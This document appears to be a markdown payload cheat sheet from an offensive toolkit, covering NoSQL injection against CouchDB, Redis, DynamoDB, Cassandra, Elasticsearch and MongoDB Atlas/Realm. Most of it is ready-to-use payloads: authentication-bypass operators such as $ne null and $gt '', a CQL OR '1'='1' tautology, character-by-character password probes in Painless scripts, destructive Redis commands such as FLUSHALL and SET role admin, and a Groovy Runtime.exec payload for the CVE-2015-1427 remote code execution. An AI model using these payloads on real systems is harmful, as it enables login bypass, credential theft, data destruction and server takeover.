# Other NoSQL — CouchDB, Redis, DynamoDB, Cassandra, etc.

## CouchDB — the Mango query-language

```json
{"selector": {"user": {"$ne": null}}}
{"selector": {"user": {"$gt": ""}, "pass": {"$gt": ""}}}
{"selector": {"user": {"$regex": "^a"}}}
{"selector": {"$or": [{"user": "a"}, {"user": "b"}]}}
{"selector": {"$and": [{"user": {"$ne": null}}]}}
{"selector": {"user": {"$exists": true}}}
{"selector": {"user": {"$in": ["a", "b"]}}}
{"selector": {"user": {"$type": "string"}}}
{"selector": {"user": {"$size": 2}}}
{"selector": {"user": {"$all": ["a"]}}}
{"selector": {"user": {"$elemMatch": {"x": {"$gt": 0}}}}}
{"selector": {"user": {"$mod": [4, 0]}}}
{"selector": {"user": {"$not": {"$eq": "x"}}}}
{"selector": {"user": {"$text": "x"}}}
{"selector": {"$where": "this.pass"}}
{"selector": {"user": {"$expr": {}}}}
```

`_find` — the Mango-selector — the `$`-operators are the same family —
`operators.md` — but the endpoint is `POST /db/_find`, the body wraps in
`selector`, and `enableJs`-style JS is not supported — `$where` only via
the `map_fun`/view, not the selector.

## CouchDB `map_fun` — the JS-view

```json
{"map_fun": "function(doc) { emit(doc.pass, 1); }"}
{"map": "function(doc) { emit(doc.pass, 1); }"}
{"reduce": "_count"}
{"reduce": "_sum"}
{"reduce": "_stats"}
{"reduce": "function(k, v) { return v; }"}
```

`map`/`reduce` — the JS-view — `operators-js.md` — CouchDB's JS-engine
spider-monkey — the `map_fun` is the JS-injection.

## Redis — the command-injection

```text
KEYS *
GET flag
SET role admin
EVAL "return redis.call('get','flag')" 0
EVALSHA <sha> 0
FLUSHALL
CONFIG GET *
MODULE LIST
SCRIPT LOAD "return 1"
```

Redis — not a query-language, a command-protocol — the injection is
CRLF-splitting (`skills/web-request-smuggling/`) or Lua `EVAL` —
different shape; this class covers the QUERY-operator injection, Redis
CRLF belongs to request-smuggling/command-injection.

## DynamoDB — the expression-injection

```json
{"FilterExpression": "user = :u", "ExpressionAttributeValues": {":u": "x"}}
{"KeyConditionExpression": "user = :u AND pass > :p"}
{"ExpressionAttributeNames": {"#u": "user"}}
{"ProjectionExpression": "#u, pass"}
```

DynamoDB — `ExpressionAttributeValues` — the injection is in the
EXPRESSION string — the `:u` placeholders are safe, a raw
`FilterExpression: "user = '" + input + "'"` is injectable — the
SQLi-style string-injection, not the object-operator shape.

## Cassandra (CQL) — the string-injection

```cql
SELECT * FROM users WHERE user = 'x' AND pass = 'y' ALLOW FILTERING
SELECT * FROM users WHERE user = 'x' OR '1'='1'
```

CQL — string-injection — `skills/web-sqli/` territory, not here.

## CouchDB `usersDB`/`system` — the meta

```json
{"selector": {"name": {"$regex": "^a"}}}
GET /_users/_find
GET /_replicator/_find
GET /_all_dbs
GET /_utils
GET /_up
GET /_active_tasks
GET /_membership
GET /_scheduler/jobs
GET /_node/_local/_system
```

CouchDB's `_users`/`_replicator`/`_all_dbs` — the meta-endpoints —
`mongo-specific.md`-adjacent.

## Elasticsearch — the query-DSL

```json
{"query": {"match": {"user": "admin"}}}
{"query": {"bool": {"must": [{"match": {"user": "x"}}]}}}
{"query": {"wildcard": {"pass": "a*"}}}
{"query": {"regexp": {"pass": "a.*"}}}
{"query": {"fuzzy": {"pass": "x"}}}
{"query": {"script": {"script": "doc['pass'].value == 'x'"}}}
{"query": {"script": {"script": {"source": "doc['pass'].value == 'x'"}}}}
{"query": {"match_all": {}}}
{"query": {"exists": {"field": "pass"}}}
{"query": {"prefix": {"pass": "a"}}}
{"query": {"range": {"pass": {"gt": "m"}}}}
{"query": {"term": {"pass": "x"}}}
{"query": {"terms": {"pass": ["x", "y"]}}}
{"query": {"query_string": {"query": "pass:a*"}}}
{"query": {"simple_query_string": {"query": "pass:a*"}}}
```

The ES-DSL — `script`/`regexp`/`wildcard`/`prefix`/`range`/`exists` —
the object-injection family — `enableJs`-equivalent is the
`script.painless`/`script.groovy` — `operators-js.md`-adjacent.

## Elasticsearch `painless` — the script

```json
{"script": {"source": "doc['pass'].value == 'x'"}}
{"script": {"source": "doc['pass'].value.startsWith('f')"}}
{"script": {"source": "doc['pass'].value.charAt(0) == 'f'"}}
{"script": {"source": "doc['pass'].value.length() == 32"}}
{"script": {"source": "return doc['pass'].value == params.p", "params": {"p": "x"}}}
{"script": {"source": "int a = doc['pass'].value.length(); return a > 20"}}
{"script": {"source": "if (doc['pass'].value == 'x') { return 1; } return 0;"}}
{"script": {"lang": "painless", "source": "doc['pass'].value == 'x'"}}
```

`painless` — ES's script-lang — `operators-js.md`-adjacent.

## Elasticsearch `groovy` — the RCE-script

```json
{"script": {"lang": "groovy", "source": "1+1"}}
{"script": {"lang": "groovy", "source": "java.lang.Runtime.getRuntime().exec('id')"}}
```

`groovy` — the ES-1.x CVE-2015-1427 RCE — `operators-js.md`-adjacent —
the RCE path.

## MongoDB Atlas — the `data API`

```json
{"collection": "users", "database": "x", "dataSource": "y", "filter": {"user": {"$ne": null}}}
{"collection": "users", "database": "x", "dataSource": "y", "pipeline": [{"$unionWith": "flag"}]}
```

The Data-API — `filter`/`pipeline`/`document`/`documents`/`update`/
`insert`/`delete` — the object-injection carriers — `injection-points.md`.

## MongoDB Stitch/Realm — the rules

```json
{"user": {"$ne": null}}
{"filter": {"user": {"$ne": null}}}
{"query": {"user": {"$ne": null}}}
```

Stitch/Realm — `mongo-specific.md`.
